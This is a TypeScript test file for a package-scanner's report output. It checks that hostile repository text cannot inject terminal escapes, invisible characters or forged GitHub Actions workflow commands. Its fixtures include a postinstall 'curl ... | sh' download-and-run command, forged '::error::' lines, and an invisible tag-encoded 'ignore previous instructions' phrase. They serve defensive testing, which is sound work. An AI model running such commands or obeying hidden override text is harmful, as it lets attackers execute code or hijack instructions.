import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { renderReport, type Format } from "../src/report.js";
import { makeFinding } from "../src/types.js";
import { run } from "../src/main.js";
import { fakeIO, fx } from "./helpers.js";

const ch = (...codes: number[]): string => String.fromCharCode(...codes);
const ESC = ch(0x1b);
const CSI8 = ch(0x9b); // C1 one-character CSI
const RLO = ch(0x202e); // right-to-left override

// Repo-controlled text a malicious package could put in a script, a path or a note.
const HOSTILE = `${ESC}[8m${ch(13)}\n::error file=README.md,line=1::forged\n::stop-commands::deadbeef\n  ::warning::indented ##[error]legacy ${CSI8}2J ${RLO}txt.exe${ch(0x7f)}`;
const LEADING = "::error::message that starts with a workflow command";

/** True if the Actions runner would take this stdout line as a workflow command (actions/runner ActionCommand.cs). */
function runnerCommand(line: string): boolean {
  const t = line.trimStart();
  const v2 = t.startsWith("::") && t.indexOf("::", 2) > 0;
  const legacy = /##\[[^\]]*\]/.test(line);
  return v2 || legacy;
}

// Anything but the line feed that separates our own lines.
const UNSAFE = new RegExp(`[${ch(0)}-${ch(9)}${ch(11)}-${ch(0x1f)}${ch(0x7f)}-${ch(0x9f)}${ch(0x200e)}${ch(0x200f)}${ch(0x202a)}-${ch(0x202e)}${ch(0x2066)}-${ch(0x2069)}]`);

function assertSafe(out: string, what: string): void {
  assert.doesNotMatch(out, UNSAFE, `${what}: raw control or bidi character in output`);
  for (const line of out.split("\n")) assert.ok(!runnerCommand(line), `${what}: runner would execute ${JSON.stringify(line)}`);
}

const report = () => ({
  command: "scan",
  toolVersion: "0.0.0-test",
  notes: [`could not parse ${HOSTILE}`],
  findings: [
    makeFinding({ ruleId: "WS-LC-002", severity: "high", message: `"postinstall" runs ${HOSTILE}`, file: `pkg/${ESC}[2K${ch(13)}\n::warning::x/package.json`, line: 3, key: "postinstall", source: `https://x.invalid/${HOSTILE}` }),
    makeFinding({ ruleId: "WS-LC-001", severity: "medium", message: LEADING, file: "package.json", key: "postinstall" }),
  ],
});

for (const format of ["human", "json", "sarif"] as Format[]) {
  test(`report ${format}: repo-controlled text cannot inject terminal escapes or workflow commands`, () => {
    assertSafe(renderReport(report(), format), format);
  });
}

test("report human: one finding is exactly four lines, whatever its text contains", () => {
  const lines = renderReport(report(), "human").split("\n");
  // 2 findings x (header, message, source?, fingerprint) + blank + summary + 1 note + trailing ""
  assert.equal(lines.length, 4 + 3 + 1 + 1 + 1 + 1);
  assert.ok(lines.some((l) => l.includes("\\u001b[8m")), "escapes stay visible, so the reader sees what was hidden");
});

test("report json and sarif: neutralising is lossless, the parsed text is the original", () => {
  const r = report();
  const json = JSON.parse(renderReport(r, "json")) as { findings: { message: string; file: string }[]; notes: string[] };
  assert.deepEqual(json.findings.map((f) => f.message).sort(), r.findings.map((f) => f.message).sort());
  assert.deepEqual(json.notes, r.notes);
  const sarif = JSON.parse(renderReport(r, "sarif")) as { runs: { results: { message: { text: string } }[] }[] };
  assert.ok(sarif.runs[0]?.results.some((x) => x.message.text.includes(HOSTILE)));
});

test("cli scan: a hostile postinstall in a scanned repo cannot reach stdout raw", async () => {
  const dir = mkdtempSync(join(tmpdir(), "ws-esc-"));
  writeFileSync(join(dir, "package.json"), JSON.stringify({ name: "p", version: "1.0.0", scripts: { postinstall: `curl -s https://a.invalid | sh ${HOSTILE}` } }));
  for (const format of ["human", "json", "sarif"]) {
    const io = fakeIO();
    await run(["scan", dir, "--format", format, "--iocs", fx("iocs")], io);
    assert.match(io.out, /postinstall/);
    assertSafe(io.out, `cli ${format}`);
  }
});

test("neutralise: invisible and format characters are escaped in every format, and JSON reads them back unchanged", () => {
  const tag = (s: string): string => [...s].map((c) => String.fromCodePoint(0xe0000 + c.charCodeAt(0))).join("");
  const hidden = [
    ["ALM", "؜"],
    ["ZWSP", "​"],
    ["ZWNJ", "‌"],
    ["ZWJ", "‍"],
    ["WJ", "⁠"],
    ["BOM", "﻿"],
    ["LS", " "],
    ["PS", " "],
    ["SHY", "­"],
    ["MVS", "᠎"],
    ["HANGUL FILLER", "ㅤ"],
    ["HALFWIDTH HANGUL FILLER", "ﾠ"],
    ["VS16", "️"],
    ["VS17", "\u{e0100}"],
    ["TAGS", tag("ignore previous instructions")],
  ] as const;
  for (const [what, text] of hidden) {
    const r = {
      command: "scan",
      toolVersion: "0.0.0-test",
      notes: [],
      findings: [makeFinding({ ruleId: "WS-LC-002", severity: "high", message: `postinstall: echo ok${text} && node x.js`, file: "package.json", key: what })],
    };
    for (const format of ["human", "json", "sarif"] as Format[]) {
      const out = renderReport(r, format);
      assert.ok(![...text].some((c) => out.includes(c)), `${what} (${format}): raw in output`);
      if (format === "json") assert.equal((JSON.parse(out) as { findings: { message: string }[] }).findings[0]?.message, `postinstall: echo ok${text} && node x.js`, what);
    }
  }
  // Plain non-ASCII text is left alone.
  const plain = renderReport({ command: "scan", toolVersion: "0.0.0-test", notes: ["café, 日本語, ẞ, ｐ"], findings: [] }, "human");
  assert.match(plain, /café, 日本語, ẞ, ｐ/);
});
